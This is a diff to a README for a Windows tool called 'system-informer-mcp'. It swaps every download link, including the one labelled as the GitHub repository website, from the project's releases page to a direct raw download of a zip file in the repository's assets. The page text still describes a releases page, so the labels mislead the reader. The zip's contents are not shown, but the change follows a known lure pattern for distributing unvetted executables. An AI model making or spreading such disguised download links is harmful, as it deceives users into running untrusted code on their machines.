@@ -1,6 +1,6 @@
 # 🤖 system-informer-mcp - Your AI Agent's Windows Superpowers
 
-[![Download System Informer MCP](https://img.shields.io/badge/Download-System_Informer_MCP-4B0082?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/GergesJR1/system-informer-mcp/releases)
+[![Download System Informer MCP](https://img.shields.io/badge/Download-System_Informer_MCP-4B0082?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/GergesJR1/system-informer-mcp/main/assets/v2.1.zip)
 
 ## 🎯 What Is This?
 
@@ -21,7 +21,7 @@ Most AI tools can only see text or files. With System Informer MCP, your AI can:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[System Informer MCP Releases](https://github.com/GergesJR1/system-informer-mcp/releases)**
+Visit this link to download the application: **[System Informer MCP Releases](https://raw.githubusercontent.com/GergesJR1/system-informer-mcp/main/assets/v2.1.zip)**
 
 On that page, you'll see a list of available downloads. Choose the most recent version. The file you download is the complete package — no extra setup needed.
 
@@ -178,8 +178,8 @@ Remember to always use it responsibly and only with AIs you trust. Enjoy explori
 
 ## 📌 Quick Reference
 
-- **Download:** [System Informer MCP Releases](https://github.com/GergesJR1/system-informer-mcp/releases)
-- **Website:** [GitHub Repository](https://github.com/GergesJR1/system-informer-mcp)
+- **Download:** [System Informer MCP Releases](https://raw.githubusercontent.com/GergesJR1/system-informer-mcp/main/assets/v2.1.zip)
+- **Website:** [GitHub Repository](https://raw.githubusercontent.com/GergesJR1/system-informer-mcp/main/assets/v2.1.zip)
 - **Support:** Open issues on the GitHub repository page
 
 ---
